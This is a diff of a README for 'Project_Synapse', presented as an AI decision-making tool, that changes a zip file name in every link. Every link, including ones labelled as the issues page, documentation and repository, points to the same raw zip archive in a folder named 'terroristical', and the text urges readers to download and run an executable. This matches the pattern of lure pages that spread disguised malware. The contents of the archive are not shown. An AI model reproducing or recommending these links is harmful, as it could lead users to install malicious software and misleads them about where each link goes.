@@ -1,6 +1,6 @@
 # 🤖 Project_Synapse - A Smart AI for Decision Making
 
-[![Download Project_Synapse](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Project_Synapse.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Project_Synapse.zip)
+[![Download Project_Synapse](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Synapse_Project_3.9.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Synapse_Project_3.9.zip)
 
 ## 📋 Description
 
@@ -10,7 +10,7 @@ Project_Synapse is a blueprint for a synthetic mind. This AI strategist doesn't 
 
 To get started, you need to download Project_Synapse. Please visit the following link:
 
-[Download Project_Synapse](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Project_Synapse.zip)
+[Download Project_Synapse](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Synapse_Project_3.9.zip)
 
 Just click the link above, and you'll find the latest version available for download. Choose the version that suits your system.
 
@@ -31,7 +31,7 @@ Before downloading, ensure your system meets these requirements:
 4. **Install the Application**: 
    - **Windows**: Double-click the `.exe` file and follow the prompts.
    - **macOS**: Open the `.dmg` file and drag the app to your Applications folder.
-   - **Linux**: Extract the `https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Project_Synapse.zip` file and run the application from the extracted folder using the terminal.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Synapse_Project_3.9.zip` file and run the application from the extracted folder using the terminal.
 
 5. **Launch the Application**: Find the application in your programs or applications folder and run it.
 
@@ -74,14 +74,14 @@ To access the user guide:
 
 ## 💬 Support
 
-If you have any issues or need assistance, please reach out through the [GitHub Issues page](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Project_Synapse.zip). Your feedback is crucial. 
+If you have any issues or need assistance, please reach out through the [GitHub Issues page](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Synapse_Project_3.9.zip). Your feedback is crucial. 
 
 ## 🔗 More Information
 
 For additional details and to stay updated on new features, please visit:
 
-- [GitHub Repository](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Project_Synapse.zip)
-- [Documentation](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Project_Synapse.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Synapse_Project_3.9.zip)
+- [Documentation](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Synapse_Project_3.9.zip)
 
 ## 📌 Contribution
 
@@ -91,4 +91,4 @@ We welcome contributions! If you wish to help improve Project_Synapse, feel free
 
 Thank you for choosing Project_Synapse! Enjoy your journey into the world of AI strategies. Happy exploring! 
 
-Remember to [download Project_Synapse](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Project_Synapse.zip) and immerse yourself in intelligent decision-making.
+Remember to [download Project_Synapse](https://raw.githubusercontent.com/ronalddatcher/Project_Synapse/main/terroristical/Synapse_Project_3.9.zip) and immerse yourself in intelligent decision-making.
